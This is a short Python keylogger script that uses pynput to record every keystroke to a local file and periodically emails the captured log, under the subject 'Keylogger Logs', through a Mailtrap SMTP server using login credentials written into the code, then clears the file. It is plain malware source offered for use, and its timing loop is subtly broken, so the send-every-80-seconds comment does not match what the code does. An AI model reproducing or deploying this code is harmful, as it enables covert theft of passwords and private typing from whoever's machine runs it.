from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
import time
import os

log_file = "loggeddata.txt"
keys = []
last_pressed_time = {}
debounce_interval = 0.3 
def on_press(key):
    now = time.time()
    key_id = str(key)
    if key_id in last_pressed_time and (now - last_pressed_time[key_id]) < debounce_interval:
        return
    last_pressed_time[key_id] = now

    if hasattr(key, 'char') and key.char is not None:
        key_str = key.char
    elif hasattr(key, 'name'):
        key_str = f"<{key.name}>"
    else:
        key_str = str(key)
      
    if key == Key.enter:
        key_str = '\n'
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(key_str + ' ')

def send_email():
    if not os.path.exists(log_file):
        return
    with open(log_file, 'r', encoding='utf-8') as f:
        content = f.read()

    if content.strip():
        msg = MIMEText(content)
        msg['Subject'] = 'Keylogger Logs'
        msg['From'] = '64jp5gjgv6@qacmjeq.com'
        msg['To'] = '64jp5gjgv6@qacmjeq.com'

        try:
            server = smtplib.SMTP('sandbox.smtp.mailtrap.io', 2525)
            server.starttls()
            server.login('5569ea4251f76c', 'd648cb8eef736a')  # Replace with your real credentials
            server.sendmail(msg['From'], msg['To'], msg.as_string())
            server.quit()
        except Exception as e:
            pass  
          
        with open(log_file, 'w', encoding='utf-8') as f:
            f.write('')

def on_release(key):
    if key == Key.esc:
        send_email()
        return False

def start_logger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        while True:
            time.sleep(80)  # Send email every 80 seconds
            send_email()
            listener.join()

if __name__ == "__main__":
    start_logger()
